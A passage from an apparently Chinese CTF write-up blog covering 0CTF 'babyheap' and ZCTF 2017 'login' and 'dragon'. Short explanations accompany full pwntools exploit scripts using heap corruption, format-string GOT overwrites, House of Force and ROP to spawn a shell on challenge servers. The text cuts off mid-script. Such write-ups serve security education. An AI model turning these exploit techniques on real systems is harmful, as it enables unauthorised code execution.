class="string">'A\n'</span>)</div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'GGGGGGGGGGGGGGGG\n'</span>)</div><div class="line">    New(p, <span class="number">2016</span>, <span class="string">'C\n'</span>)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">"3. Exit\n\n"</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">'2.'</span>)</div><div class="line">    data = p.recvuntil(<span class="string">'GGGGGGGGGGGGGGGG'</span>, drop = <span class="keyword">True</span>)[<span class="number">-16</span>:]</div><div class="line">    p.recvuntil(<span class="string">'Which Message You Want To Delete?\n'</span>)</div><div class="line">    p.send(str(<span class="number">6</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    heap_addr = u64(data[:<span class="number">8</span>])</div><div class="line"></div><div class="line">    log.info(<span class="string">"heap addr: "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">    Delete(p, <span class="number">2</span>)</div><div class="line">    Delete(p, <span class="number">1</span>)</div><div class="line">    Delete(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="string">'''</span></div><div class="line">    0x7fb7d3d0b800:    0x0000000000000043    0x0000000000000408</div><div class="line">    0x7fb7d3d0b810:    0x00007fb7d3d0b820    0x0000000000400976</div><div class="line">    0x7fb7d3d0b820:    0x4747474747474747    0x4747474747474747</div><div class="line">    '''</div><div class="line">    payload = <span class="string">''</span></div><div class="line">    payload += p64(<span class="number">0x43</span>)</div><div class="line">    payload += p64(<span class="number">0x408</span>)</div><div class="line">    payload += p64(<span class="number">0x000000000603280</span>)</div><div class="line">    payload += p64(<span class="number">0x400976</span>)</div><div class="line"></div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'A\n'</span>)</div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'GGGGGGGGGGGGGGGG\n'</span>)</div><div class="line">    New(p, <span class="number">2016</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">"3. Exit\n\n"</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">'1. '</span>)</div><div class="line"></div><div class="line">    libc_start_main_addr = u64(p.recvn(<span class="number">8</span>))</div><div class="line">    log.info(<span class="string">'__libc_start_main() addr: '</span> + hex(libc_start_main_addr))</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">'Which Message You Want To Delete?\n'</span>)</div><div class="line">    p.send(str(<span class="number">6</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    <span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</div><div class="line"></div><div class="line">    offset_libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">    offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line">    offset_binsh = next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line"></div><div class="line">    libc_base = libc_start_main_addr - offset_libc_start_main</div><div class="line">    system_addr = libc_base + offset_system</div><div class="line">    binsh_addr = libc_base + offset_binsh</div><div class="line"></div><div class="line">    Delete(p, <span class="number">2</span>)</div><div class="line">    Delete(p, <span class="number">1</span>)</div><div class="line">    Delete(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">    payload = <span class="string">''</span></div><div class="line">    payload += p64(<span class="number">0x43</span>)</div><div class="line">    payload += p64(<span class="number">0x408</span>)</div><div class="line">    payload += p64(binsh_addr)</div><div class="line">    payload += p64(system_addr)</div><div class="line"></div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'A\n'</span>)</div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'GGGGGGGGGGGGGGGG\n'</span>)</div><div class="line">    New(p, <span class="number">2016</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>任意字节的堆溢出，但是用的<code>calloc()</code>，申请对块时会清空推块内容，不好leak，后来使用extend chunk的方法产生堆块重叠，释放一个被覆盖的堆块来leak main_arena<br>之后决定利用unsort bin attack，修改<code>global_max_fast</code>位<code>main_arena</code>指针，这样之后所有大小堆块都会被当作fast chunk来对待<br>西电dalao在题目给的libc里发现一个离<code>__malloc_hook</code>很近地方的值为0x300，利用fastbin attack将堆块分配到那，然后修改<code>__malloc_hook</code>为libc中<code>execve(&quot;/bin/sh&quot;)</code>的one-gadget来getshell<br>这里就贴一个我本机跑起来的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'info'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(p, idx, size, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command: '</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./babyheap_patched'</span>)</div><div class="line"><span class="comment">#p = remote('202.120.7.218', 2017)</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#</span></div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#</span></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">New(p, <span class="number">0x80</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x90</span> * <span class="number">2</span> + <span class="number">1</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">0</span>, len(payload), payload)</div><div class="line"></div><div class="line">Free(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x90</span> * <span class="number">2</span> - <span class="number">0x10</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, len(payload), payload)</div><div class="line"></div><div class="line">Free(p, <span class="number">2</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, <span class="number">0x90</span>, <span class="string">'A'</span> * <span class="number">0x90</span>)</div><div class="line"></div><div class="line">Free(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">Dump(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x90</span>)</div><div class="line"></div><div class="line">main_arena = u64(p.recvn(<span class="number">8</span>))</div><div class="line">heap_addr = u64(p.recvn(<span class="number">8</span>))</div><div class="line"><span class="string">'''</span></div><div class="line">libc_base = main_arena - 0x398b58</div><div class="line">global_max_fast = libc_base + 0x39a7d0</div><div class="line">'''</div><div class="line"></div><div class="line">libc_base = main_arena - <span class="number">0x3a5678</span></div><div class="line">global_max_fast = libc_base + <span class="number">0x3a7860</span></div><div class="line"></div><div class="line">log.info(<span class="string">"main_arena : "</span> + hex(main_arena))</div><div class="line">log.info(<span class="string">"heap addr : "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line">payload += p64(global_max_fast - <span class="number">0x10</span>) * <span class="number">2</span></div><div class="line"></div><div class="line">Fill(p, <span class="number">1</span>, len(payload), payload)</div><div class="line"></div><div class="line">New(p, <span class="number">0x80</span>)<span class="comment">#modify global_max_fast</span></div><div class="line"></div><div class="line">Free(p, <span class="number">5</span>)<span class="comment">#free 0x2f0 chunk(malloc before)</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">Free(p, <span class="number">4</span>)<span class="comment">#free 0x2f0 chunk(just malloc)</span></div><div class="line"></div><div class="line">fake_chunk_header = <span class="number">0x398617</span> + libc_base</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x80</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x91</span>)</div><div class="line">payload += p64(heap_addr - <span class="number">0x120</span>)</div><div class="line">payload += p64(main_arena)</div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x70</span></div><div class="line">payload += p64(<span class="number">0x90</span>)</div><div class="line">payload += p64(<span class="number">0x300</span>)</div><div class="line">payload += p64(fake_chunk_header)</div><div class="line"></div><div class="line">Fill(p, <span class="number">3</span>, len(payload), payload)</div><div class="line"></div><div class="line">New(p, <span class="number">0x2f0</span>)</div><div class="line">New(p, <span class="number">0x2f0</span>)<span class="comment">#point to fake chunk</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">0x4c9</span></div><div class="line">payload += p64(libc_base + <span class="number">0x00000000003F33A</span>)</div><div class="line"></div><div class="line">Fill(p, <span class="number">5</span>, len(payload), payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
      
    </div>
  </div>
</article>

  
    
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2017-02-27
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        ZCTF 2017 write up
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>刚开始看这题的时候有点不知所云，完全不知道是要leak canary还是爆破来做，第二天想到，<code>succ()</code>中<code>sprintf()</code>函数的格式化字符串参数是在栈上的，<br>尝试下用s1修改他,果然成功修改输出s2的格式(第一天的时候就有这个现象了，当时还以为<code>printf()</code>有bug…)<br>然后就是用格式化字符串修改<code>stack_chk_fail@got</code>，原本是想找个ret的gadget，但是很奇怪的是没办法用格式化字符串精确修改，好像每多输出一个字符修改的结果会多2，<br>后来发现只修改一个字节刚好可以把<code>stack_chk_fail@got</code>修改成<code>malloc@plt + 6</code>这样即使修改了canary函数也可以正常返回，然后就可以愉快的做ROP了<br>然后做ROP执行<code>system(&#39;/bin/sh&#39;)</code>的时候老是失败，感觉是因为前面的格式化字符串修改了太多栈的内容影响到了<code>system()</code>,<br>于是转而用syscall执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code>这里要把ecx,edx都设置为0，然而<code>sprintf()</code>遇到\x00就断了，<br>调试的时候发现执行ROP的时候edx已经为0了，然后在题目给的libc里面找到了这么一个gadget</p>
<pre><code>0x000282d3 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
</code></pre><p>然后就可以愉快的getshell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">main_addr = <span class="number">0x0804878C</span></div><div class="line">stack_chk_fail_got = <span class="number">0x0804A014</span></div><div class="line">malloc_got = <span class="number">0x0804A018</span></div><div class="line">puts_plt = <span class="number">0x080484C0</span></div><div class="line">ret = <span class="number">0x804844e</span></div><div class="line">pop_ret = <span class="number">0x08048465</span></div><div class="line">inc_ecx_ret = <span class="number">0x08048aee</span></div><div class="line">ebx_ret = <span class="number">0x08048465</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">i = 1</div><div class="line">while i &lt; 100:</div><div class="line">    p = process('./login')</div><div class="line">    p.recvuntil('Input the username:')</div><div class="line">    payload = ''</div><div class="line">    payload += p32(stack_chk_fail_got)</div><div class="line">    payload += 'A' * (0x4c)</div><div class="line">    payload += p32(main_addr)</div><div class="line">    payload += p32(stack_chk_fail_got) * 9 + 'AA'</div><div class="line">    payload += 'KK:%' + str(i) + '$x'</div><div class="line">    p.send(payload + '\n')</div><div class="line">    p.recvuntil('Input the password:')</div><div class="line">    p.send('123\n')</div><div class="line">    p.recvuntil("$x:")</div><div class="line">    data = int(p.recvuntil(':', drop = True), 16)</div><div class="line">    if data == stack_chk_fail_got:</div><div class="line">        print "succ", i</div><div class="line">        exit(0)</div><div class="line">    p.close()</div><div class="line">    i = i + 1</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="comment">#p = process('./login')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">4002</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Input the username:'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p32(stack_chk_fail_got)</div><div class="line">payload += p32(stack_chk_fail_got + <span class="number">1</span>) * <span class="number">19</span></div><div class="line">payload += p32(main_addr)</div><div class="line">payload += p32(stack_chk_fail_got) * <span class="number">9</span> + <span class="string">'AA'</span></div><div class="line">payload += <span class="string">'K:%47c'</span></div><div class="line">payload += <span class="string">'%10$hhn'</span></div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the username:'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * (<span class="number">0x4c</span> + <span class="number">4</span>)</div><div class="line">payload += p32(puts_plt)</div><div class="line">payload += p32(pop_ret)</div><div class="line">payload += p32(malloc_got)</div><div class="line">payload += p32(main_addr)</div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Login successful!\n'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">malloc_addr = u32(p.recvn(<span class="number">4</span>))</div><div class="line">log.info(<span class="string">'malloc() addr: '</span> + hex(malloc_addr))</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"><span class="comment">#libc = ELF('./local.libc32')</span></div><div class="line"></div><div class="line">offset_malloc = libc.symbols[<span class="string">'malloc'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line">offset_binsh = next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line"></div><div class="line">libc_base = malloc_addr - offset_malloc</div><div class="line">system_addr = libc_base + offset_system</div><div class="line">binsh_addr = libc_base + offset_binsh</div><div class="line"></div><div class="line"><span class="comment">#int80 = libc_base + 0x000B14DD</span></div><div class="line">int80 = libc_base + <span class="number">0x000B4EBB</span></div><div class="line">xorecx_ebx_pppop_ret = libc_base + <span class="number">0x000282d3</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * (<span class="number">0x4c</span> + <span class="number">4</span>)</div><div class="line">payload += p32(xorecx_ebx_pppop_ret)</div><div class="line">payload += p32(binsh_addr)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">3</span></div><div class="line">payload += p32(int80)</div><div class="line"></div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Input the password:'</span>)</div><div class="line">p.send(<span class="string">'123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Login successful!\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h2><p>程序漏洞在申请堆块存放content的时候是根据输入字符串大小申请堆块的，然是<code>edit()</code>函数固定修改32个字节，这样就存在溢出了<br>利用House of Force这个技巧，溢出修改Top Chunk的大小，而且程序申请堆块存放name的时候，也只是检查长度是否小于32，并没有检查是否为负数，<br>这样就可以申请大小为负的堆块，然后分配到一个指向bss段中的list，然后就可以任意读写了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size, name, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input note name size: '</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input note name: '</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'please input note content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p, idx, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input new note content: '</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'input note id: '</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./dragon')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">11501</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'B'</span> * <span class="number">0x20</span>)</div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'C'</span> * <span class="number">0x10</span>, <span class="string">'D'</span> * <span class="number">0x20</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line">Delete(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x602058</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x602058</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">0x10</span>, <span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'A'</span> * <span class="number">0x20</span>)</div><div class="line">Edit(p, <span class="number">0</span>, payload)</div><div class="line"></div><div class="line">List(p, <span class="number">0</span>)</div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x10</span>)</div><div class="line">data = p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>)</div><div class="line"><span class="keyword">if</span> len(data) &lt; <span class="number">4</span>:</div><div class="line">    log.error(<span class="string">"maybe error!"</span>)</div><div class="line">    exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">heap_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"heap addr : "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">fake_note = heap_addr + <span class="number">0x80</span></div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'E'</span> * <span class="number">0x20</span>, <span class="string">'F'</span> * <span class="number">0x20</span>)</div><div class="line">New(p, <span class="number">0x18</span>, <span class="string">'G'</span> * <span class="number">0x18</span>, <span class="string">'H'</span> * <span class="number">0x17</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">2</span>, <span class="string">'H'</span> * <span class="number">0x18</span> + p64(<span class="number">0xffffffffffffffff</span>))</div><div class="line"></div><div class="line">top_chunk = heap_addr + <span class="number">0x148</span></div><div class="line">offset = <span class="number">0x00000000006020e0</span> - top_chunk</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</div><div class="line">p.send(<span class="string">'1\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'please input note name size: '</span>)</div><div class="line">p.send(str(offset - <span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'please input note content: '</span>)</div><div class="line">p.send(p64(fake_note))</div><div class="line"></div><div class="line">List(p, <span class="number">2</span>)</div><div class="line">p.recvuntil(<span class="string">'name: '</span>)</div><div class="line">data = p.recvn(<span class="number">6</span>)</div><div class="line">libc_start_main_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"__libc_start_main() addr: "</span> + hex(libc_start_main_addr))</div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"></div><div class="line">offset_libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">libc_base = libc_start_main_addr - offset_libc_start_main</div><div class="line">system_addr = libc_base + offset_system</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x602018</span>)</div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span 